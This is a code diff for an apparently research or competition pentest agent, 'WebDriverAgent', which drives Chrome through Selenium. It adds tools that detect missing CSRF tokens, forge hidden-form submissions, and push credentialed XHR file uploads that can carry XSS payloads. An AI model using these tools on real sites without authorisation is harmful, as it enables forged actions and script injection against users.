@@ -1,7 +1,6 @@
 import os
 from agentlib import AgentWithHistory
 from agentlib.lib.common.parsers import BaseParser
-from agentlib.lib.tools import tool
 from typing import Optional
 from selenium import webdriver
 from selenium.webdriver.common.by import By
@@ -37,6 +36,26 @@ class WebDriverOutputParser(BaseParser):
     
     def get_format_instructions(self) -> str:
         return OUTPUT_DESCRIPTION
+    
+    def invoke(self, input, config=None, **kwargs):
+        """Handle both string and dict inputs from agent executor"""
+        # Agent executor returns dict with 'output' key
+        if isinstance(input, dict):
+            if 'output' in input:
+                text = input['output']
+            elif 'content' in input:
+                text = input['content']
+            else:
+                # Try to convert dict to string
+                text = str(input)
+        else:
+            text = input
+        
+        # Ensure text is a string
+        if not isinstance(text, str):
+            text = str(text)
+        
+        return self.parse(text, **kwargs)
     
     def parse(self, text: str, **kwargs) -> dict:
         """Parse XML report format from WebDriverAgent"""
@@ -109,7 +128,7 @@ class WebDriverAgent(AgentWithHistory[dict, str]):
     Agent for performing browser-based vulnerability exploitation
     Handles CSRF, XSS, and other web-based attacks that require browser interaction
     """
-    __LLM_MODEL__ = 'gpt-4o'
+    __LLM_MODEL__ = 'gpt-4o'  # gpt-4o 支持工具调用
     __SYSTEM_PROMPT_TEMPLATE__ = 'webDriverAgent/webDriverAgent.system.j2'
     __USER_PROMPT_TEMPLATE__ = 'webDriverAgent/webDriverAgent.user.j2'
     __OUTPUT_PARSER__ = WebDriverOutputParser
@@ -140,16 +159,43 @@ class WebDriverAgent(AgentWithHistory[dict, str]):
     
     def setup_driver(self, headless: bool = True):
         """Initialize Chrome WebDriver with appropriate options"""
+        from webdriver_manager.chrome import ChromeDriverManager
+        from selenium.webdriver.chrome.service import Service
+        
         chrome_options = Options()
         if headless:
-            chrome_options.add_argument('--headless')
+            chrome_options.add_argument('--headless=new')  # 使用新版 headless 模式
         chrome_options.add_argument('--no-sandbox')
         chrome_options.add_argument('--disable-dev-shm-usage')
         chrome_options.add_argument('--disable-gpu')
         chrome_options.add_argument('--window-size=1920,1080')
+        chrome_options.add_argument('--disable-extensions')
+        chrome_options.add_argument('--disable-software-rasterizer')
+        # 增加稳定性配置
+        chrome_options.add_argument('--disable-background-networking')
+        chrome_options.add_argument('--disable-default-apps')
+        chrome_options.add_argument('--disable-sync')
+        chrome_options.add_argument('--disable-translate')
+        chrome_options.add_argument('--remote-debugging-port=9222')
+        # 额外稳定性选项 - 解决 renderer timeout 问题
+        chrome_options.add_argument('--disable-hang-monitor')
+        chrome_options.add_argument('--disable-ipc-flooding-protection')
+        chrome_options.add_argument('--disable-renderer-backgrounding')
+        chrome_options.add_argument('--disable-backgrounding-occluded-windows')
+        chrome_options.add_argument('--memory-pressure-off')
+        chrome_options.page_load_strategy = 'eager'  # 更快响应，不等待所有资源
         
-        self.driver = webdriver.Chrome(options=chrome_options)
-        return "WebDriver initialized successfully"
+        try:
+            # 使用 webdriver-manager 自动下载和管理 ChromeDriver
+            service = Service(ChromeDriverManager().install())
+            self.driver = webdriver.Chrome(service=service, options=chrome_options)
+            # 设置超时 - 增加到120秒以解决慢响应问题
+            self.driver.set_page_load_timeout(120)
+            self.driver.set_script_timeout(120)
+            self.driver.implicitly_wait(15)
+            return "WebDriver initialized successfully"
+        except Exception as e:
+            return f"WebDriver initialization failed: {str(e)}"
     
     def cleanup_driver(self):
         """Close and cleanup WebDriver"""
@@ -157,202 +203,6 @@ class WebDriverAgent(AgentWithHistory[dict, str]):
             self.driver.quit()
             self.driver = None
         return "WebDriver cleaned up"
-    
-    @tool
-    def navigate_to_url(self, url: str) -> str:
-        """
-        Navigate to a specific URL
-        
-        Args:
-            url: The target URL to visit
-            
-        Returns:
-            Success message with current URL
-        """
-        if not self.driver:
-            self.setup_driver()
-        
-        self.driver.get(url)
-        time.sleep(2)  # Wait for page load
-        return f"Navigated to {self.driver.current_url}, Page title: {self.driver.title}"
-    
-    @tool
-    def find_element(self, selector: str, by: str = "css") -> str:
-        """
-        Find an element on the page
-        
-        Args:
-            selector: CSS selector or XPath
-            by: 'css' or 'xpath'
-            
-        Returns:
-            Element information or error message
-        """
-        if not self.driver:
-            return "Error: WebDriver not initialized"
-        
-        try:
-            by_type = By.CSS_SELECTOR if by == "css" else By.XPATH
-            element = WebDriverWait(self.driver, 10).until(
-                EC.presence_of_element_located((by_type, selector))
-            )
-            return f"Found element: {element.tag_name}, text: {element.text[:100]}"
-        except TimeoutException:
-            return f"Element not found: {selector}"
-        except Exception as e:
-            return f"Error finding element: {str(e)}"
-    
-    @tool
-    def click_element(self, selector: str, by: str = "css") -> str:
-        """
-        Click an element on the page
-        
-        Args:
-            selector: CSS selector or XPath
-            by: 'css' or 'xpath'
-            
-        Returns:
-            Success or error message
-        """
-        if not self.driver:
-            return "Error: WebDriver not initialized"
-        
-        try:
-            by_type = By.CSS_SELECTOR if by == "css" else By.XPATH
-            element = WebDriverWait(self.driver, 10).until(
-                EC.element_to_be_clickable((by_type, selector))
-            )
-            element.click()
-            time.sleep(1)
-            return f"Clicked element: {selector}"
-        except Exception as e:
-            return f"Error clicking element: {str(e)}"
-    
-    @tool
-    def input_text(self, selector: str, text: str, by: str = "css") -> str:
-        """
-        Input text into a form field
-        
-        Args:
-            selector: CSS selector or XPath
-            text: Text to input
-            by: 'css' or 'xpath'
-            
-        Returns:
-            Success or error message
-        """
-        if not self.driver:
-            return "Error: WebDriver not initialized"
-        
-        try:
-            by_type = By.CSS_SELECTOR if by == "css" else By.XPATH
-            element = WebDriverWait(self.driver, 10).until(
-                EC.presence_of_element_located((by_type, selector))
-            )
-            element.clear()
-            element.send_keys(text)
-            return f"Input text into {selector}"
-        except Exception as e:
-            return f"Error inputting text: {str(e)}"
-    
-    @tool
-    def execute_javascript(self, script: str) -> str:
-        """
-        Execute JavaScript in the browser context
-        
-        Args:
-            script: JavaScript code to execute
-            
-        Returns:
-            Script result or error message
-        """
-        if not self.driver:
-            return "Error: WebDriver not initialized"
-        
-        try:
-            result = self.driver.execute_script(script)
-            return f"JavaScript executed. Result: {str(result)[:200]}"
-        except Exception as e:
-            return f"Error executing JavaScript: {str(e)}"
-    
-    @tool
-    def get_page_source(self) -> str:
-        """
-        Get the current page HTML source
-        
-        Returns:
-            Page source (truncated)
-        """
-        if not self.driver:
-            return "Error: WebDriver not initialized"
-        
-        source = self.driver.page_source
-        return f"Page source (first 500 chars):\n{source[:500]}"
-    
-    @tool
-    def check_alert(self) -> str:
-        """
-        Check if an alert dialog is present (useful for XSS detection)
-        
-        Returns:
-            Alert text or "No alert present"
-        """
-        if not self.driver:
-            return "Error: WebDriver not initialized"
-        
-        try:
-            alert = self.driver.switch_to.alert
-            alert_text = alert.text
-            alert.accept()
-            return f"Alert detected! Text: {alert_text}"
-        except:
-            return "No alert present"
-    
-    @tool
-    def take_screenshot(self, filename: str) -> str:
-        """
-        Take a screenshot of the current page
-        
-        Args:
-            filename: Screenshot filename (will be saved in shared directory)
-            
-        Returns:
-            Screenshot file path
-        """
-        if not self.driver:
-            return "Error: WebDriver not initialized"
-        
-        try:
-            shared_dir = os.environ.get('SHARED_DIR', '/workspaces/submission/src/shared')
-            filepath = f"{shared_dir}/{filename}"
-            os.makedirs(os.path.dirname(filepath), exist_ok=True)
-            self.driver.save_screenshot(filepath)
-            return f"Screenshot saved to {filepath}"
-        except Exception as e:
-            return f"Error taking screenshot: {str(e)}"
-    
-    @tool
-    def create_csrf_page(self, html_content: str, filename: str = "csrf_exploit.html") -> str:
-        """
-        Create a malicious HTML page for CSRF attack
-        
-        Args:
-            html_content: HTML content for the attack page
-            filename: Output filename
-            
-        Returns:
-            File path of created page
-        """
-        try:
-            # Use mounted path for shared directory
-            shared_dir = os.environ.get('SHARED_DIR', '/workspaces/submission/src/shared')
-            filepath = f"{shared_dir}/{filename}"
-            os.makedirs(os.path.dirname(filepath), exist_ok=True)
-            with open(filepath, 'w', encoding='utf-8') as f:
-                f.write(html_content)
-            return f"CSRF page created at {filepath}"
-        except Exception as e:
-            return f"Error creating CSRF page: {str(e)}"
     
     def get_available_tools(self):
         """Return all WebDriver tools for the agent to use"""
@@ -406,17 +256,44 @@ class WebDriverAgent(AgentWithHistory[dict, str]):
                 name="create_csrf_page",
                 description="Create a malicious HTML page for CSRF attack. Args: html_content (str) - HTML content, filename (str) - Output filename. Returns: File path of created page."
             ),
+            StructuredTool.from_function(
+                func=self._verify_csrf_vulnerability,
+                name="verify_csrf_vulnerability",
+                description="Check if forms on the current page are vulnerable to CSRF (missing token protection). Args: form_selector (str) - CSS selector for forms, default 'form'. Returns: List of forms with vulnerability status."
+            ),
+            StructuredTool.from_function(
+                func=self._submit_csrf_attack,
+                name="submit_csrf_attack",
+                description="Submit a CSRF attack by creating and submitting a form with the current session. Args: target_url (str) - URL to submit to, form_data (str) - JSON string of form fields, method (str) - HTTP method. Returns: Result of submission."
+            ),
+            StructuredTool.from_function(
+                func=self._upload_file_csrf,
+                name="upload_file_csrf",
+                description="Perform CSRF file upload attack using XHR in current logged-in session. Args: upload_url (str), file_input_name (str), file_content (str), filename (str), content_type (str). Returns: Upload result."
+            ),
+            StructuredTool.from_function(
+                func=self._login,
+                name="login",
+                description="Perform login on a web application. This is more reliable than manually inputting credentials. Args: login_url (str) - URL of login page, username (str), password (str), username_selector (str) - CSS selector for username field (default: input[name='username']), password_selector (str) - CSS selector for password field (default: input[name='password']), submit_selector (str) - CSS selector for submit button (default: button[type='submit']). Returns: Login result with current URL."
+            ),
         ]
         
         return tools
     
     # Internal methods that are bound to instance (for tool use)
     def _navigate_to_url(self, url: str) -> str:
-        if not self.driver:
-            self.setup_driver()
-        self.driver.get(url)
-        time.sleep(2)
-        return f"Navigated to {self.driver.current_url}, Page title: {self.driver.title}"
+        try:
+            if not self.driver:
+                result = self.setup_driver()
+                if "failed" in result.lower():
+                    return f"Error: {result}"
+            if not self.driver:
+                return "Error: WebDriver initialization failed - driver is None"
+            self.driver.get(url)
+            time.sleep(2)
+            return f"Navigated to {self.driver.current_url}, Page title: {self.driver.title}"
+        except Exception as e:
+            return f"Error navigating to URL: {str(e)}"
     
     def _find_element(self, selector: str, by: str = "css") -> str:
         if not self.driver:
@@ -440,11 +317,121 @@ class WebDriverAgent(AgentWithHistory[dict, str]):
             element = WebDriverWait(self.driver, 10).until(
                 EC.element_to_be_clickable((by_type, selector))
             )
-            element.click()
-            time.sleep(1)
-            return f"Clicked element: {selector}"
+            
+            # 尝试普通点击
+            try:
+                element.click()
+            except Exception:
+                # 如果普通点击失败，使用 JavaScript 点击
+                self.driver.execute_script("arguments[0].click();", element)
+            
+            time.sleep(2)  # 增加等待时间，确保页面跳转
+            return f"Clicked element: {selector}, Current URL: {self.driver.current_url}"
         except Exception as e:
-            return f"Error clicking element: {str(e)}"
+            # 最后尝试用 JavaScript 直接提交表单
+            try:
+                self.driver.execute_script("document.querySelector('form').submit();")
+                time.sleep(2)
+                return f"Submitted form via JavaScript, Current URL: {self.driver.current_url}"
+            except:
+                return f"Error clicking element: {str(e)}"
+    
+    def _login(self, login_url: str, username: str, password: str, 
+               username_selector: str = "input[name='username']",
+               password_selector: str = "input[name='password']",
+               submit_selector: str = "button[type='submit']") -> str:
+        """Reliable login method with multiple fallback strategies"""
+        try:
+            if not self.driver:
+                result = self.setup_driver()
+                if "failed" in result.lower():
+                    return f"Error: {result}"
+            
+            # 1. 导航到登录页
+            self.driver.get(login_url)
+            time.sleep(2)
+            
+            # 2. 等待页面加载
+            WebDriverWait(self.driver, 10).until(
+                EC.presence_of_element_located((By.CSS_SELECTOR, username_selector))
+            )
+            
+            # 3. 输入用户名
+            user_input = self.driver.find_element(By.CSS_SELECTOR, username_selector)
+            user_input.clear()
+            user_input.send_keys(username)
+            
+            # 4. 输入密码
+            pass_input = self.driver.find_element(By.CSS_SELECTOR, password_selector)
+            pass_input.clear()
+            pass_input.send_keys(password)
+            
+            # 5. 点击登录按钮（多种策略）
+            login_success = False
+            original_url = self.driver.current_url
+            
+            # 策略1：直接点击按钮
+            try:
+                submit_btn = WebDriverWait(self.driver, 5).until(
+                    EC.element_to_be_clickable((By.CSS_SELECTOR, submit_selector))
+                )
+                submit_btn.click()
+                time.sleep(2)
+            except:
+                pass
+            
+            # 检查是否跳转
+            if self.driver.current_url != original_url and '/login' not in self.driver.current_url:
+                login_success = True
+            
+            # 策略2：JavaScript 点击
+            if not login_success:
+                try:
+                    self.driver.execute_script(f"document.querySelector('{submit_selector}').click();")
+                    time.sleep(2)
+                    if self.driver.current_url != original_url and '/login' not in self.driver.current_url:
+                        login_success = True
+                except:
+                    pass
+            
+            # 策略3：提交表单
+            if not login_success:
+                try:
+                    self.driver.execute_script("document.querySelector('form').submit();")
+                    time.sleep(2)
+                    if self.driver.current_url != original_url and '/login' not in self.driver.current_url:
+                        login_success = True
+                except:
+                    pass
+            
+            # 策略4：按 Enter 键
+            if not login_success:
+                try:
+                    from selenium.webdriver.common.keys import Keys
+                    pass_input = self.driver.find_element(By.CSS_SELECTOR, password_selector)
+                    pass_input.send_keys(Keys.RETURN)
+                    time.sleep(2)
+                    if self.driver.current_url != original_url and '/login' not in self.driver.current_url:
+                        login_success = True
+                except:
+                    pass
+            
+            # 6. 验证登录结果
+            current_url = self.driver.current_url
+            page_title = self.driver.title
+            
+            if login_success or ('/login' not in current_url):
+                return f"✅ Login successful! Current URL: {current_url}, Title: {page_title}"
+            else:
+                # 检查页面是否有错误消息
+                page_source = self.driver.page_source.lower()
+                if 'invalid' in page_source or 'error' in page_source or 'incorrect' in page_source:
+                    return f"❌ Login failed: Invalid credentials. Current URL: {current_url}"
+                else:
+                    return f"⚠️ Login status unclear. Current URL: {current_url}, Title: {page_title}. The page may need additional verification."
+                    
+        except Exception as e:
+            return f"Error during login: {str(e)}"
     
     def _input_text(self, selector: str, text: str, by: str = "css") -> str:
         if not self.driver:
@@ -508,6 +495,142 @@ class WebDriverAgent(AgentWithHistory[dict, str]):
             return f"CSRF page created at {filepath}"
         except Exception as e:
             return f"Error creating CSRF page: {str(e)}"
+    
+    def _verify_csrf_vulnerability(self, form_selector: str = "form") -> str:
+        """Check if a form is vulnerable to CSRF (no token protection)"""
+        if not self.driver:
+            return "Error: WebDriver not initialized. Call navigate_to_url first."
+        try:
+            # Find all forms
+            forms = self.driver.find_elements(By.CSS_SELECTOR, form_selector)
+            if not forms:
+                return f"No forms found with selector: {form_selector}"
+            
+            results = []
+            for i, form in enumerate(forms):
+                action = form.get_attribute('action') or 'current page'
+                method = form.get_attribute('method') or 'GET'
+                
+                # Check for CSRF protection
+                csrf_indicators = [
+                    'csrf', 'token', '_token', 'authenticity_token',
+                    'csrfmiddlewaretoken', '__requestverificationtoken'
+                ]
+                
+                form_html = form.get_attribute('outerHTML').lower()
+                has_csrf_token = any(ind in form_html for ind in csrf_indicators)
+                
+                # Also check for hidden inputs
+                hidden_inputs = form.find_elements(By.CSS_SELECTOR, "input[type='hidden']")
+                hidden_names = [inp.get_attribute('name').lower() for inp in hidden_inputs if inp.get_attribute('name')]
+                has_csrf_hidden = any(any(ind in name for ind in csrf_indicators) for name in hidden_names)
+                
+                is_vulnerable = not (has_csrf_token or has_csrf_hidden)
+                status = "🚨 VULNERABLE (No CSRF protection!)" if is_vulnerable else "✅ Protected"
+                
+                results.append(f"Form {i+1}: action={action}, method={method}, {status}")
+                if is_vulnerable:
+                    results.append(f"  Hidden inputs: {hidden_names if hidden_names else 'None'}")
+            
+            return "\\n".join(results)
+        except Exception as e:
+            return f"Error checking CSRF: {str(e)}"
+    
+    def _submit_csrf_attack(self, target_url: str, form_data: str, method: str = "POST") -> str:
+        """
+        Submit a CSRF attack request using JavaScript (simulates cross-site request).
+        This works because we're already in a logged-in session.
+        Args:
+            target_url: The URL to submit the request to
+            form_data: JSON string of form data, e.g., '{"key": "value"}'
+            method: HTTP method (POST, PUT, etc.)
+        """
+        if not self.driver:
+            return "Error: WebDriver not initialized. Navigate and login first."
+        try:
+            import json
+            data = json.loads(form_data) if isinstance(form_data, str) else form_data
+            
+            # Build JavaScript to submit form
+            js_code = f"""
+            return new Promise((resolve, reject) => {{
+                const form = document.createElement('form');
+                form.method = '{method}';
+                form.action = '{target_url}';
+                form.style.display = 'none';
+                
+                const data = {json.dumps(data)};
+                for (const [key, value] of Object.entries(data)) {{
+                    const input = document.createElement('input');
+                    input.type = 'hidden';
+                    input.name = key;
+                    input.value = value;
+                    form.appendChild(input);
+                }}
+                
+                document.body.appendChild(form);
+                
+                // For file uploads, we need a different approach
+                // This handles simple form submissions
+                form.submit();
+                
+                // Return success immediately (form.submit() navigates away)
+                resolve('Form submitted to {target_url}');
+            }});
+            """
+            
+            result = self.driver.execute_script(js_code)
+            time.sleep(2)  # Wait for navigation
+            
+            new_url = self.driver.current_url
+            new_title = self.driver.title
+            
+            return f"CSRF attack submitted! Now at: {new_url}, Title: {new_title}"
+        except Exception as e:
+            return f"Error submitting CSRF: {str(e)}"
+    
+    def _upload_file_csrf(self, upload_url: str, file_input_name: str, file_content: str, filename: str, content_type: str = "image/png") -> str:
+        """
+        Perform a CSRF file upload attack using XMLHttpRequest.
+        This simulates what a CSRF attack page would do.
+        Args:
+            upload_url: The file upload endpoint
+            file_input_name: The name attribute of the file input (e.g., 'file')
+            file_content: Content to upload (for XSS, use '<img src=x onerror=alert(1)>')
+            filename: Filename to use (e.g., 'malicious.html')
+            content_type: MIME type
+        """
+        if not self.driver:
+            return "Error: WebDriver not initialized. Navigate and login first."
+        try:
+            import json
+            # 正确转义内容用于 JavaScript
+            escaped_content = json.dumps(file_content)  # 这会正确处理引号和特殊字符
+            
+            # 使用同步方式而不是 async，避免超时问题
+            js_code = f"""
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', '{upload_url}', false);  // 同步请求
+            xhr.withCredentials = true;  // Include cookies (CSRF attack)
+            
+            var formData = new FormData();
+            var fileContent = {escaped_content};  // 使用 JSON 转义的内容
+            var blob = new Blob([fileContent], {{ type: '{content_type}' }});
+            formData.append('{file_input_name}', blob, '{filename}');
+            
+            try {{
+                xhr.send(formData);
+                return 'Upload completed! Status: ' + xhr.status + ', Response: ' + xhr.responseText.substring(0, 500);
+            }} catch(e) {{
+                return 'XHR error: ' + e.message;
+            }}
+            """
+            
+            result = self.driver.execute_script(js_code)
+            time.sleep(1)
+            return f"File upload CSRF result: {result}"
+        except Exception as e:
+            return f"Error in file upload CSRF: {str(e)}"
     
     def get_cost(self, *args, **kw) -> float:
         total_cost = 0
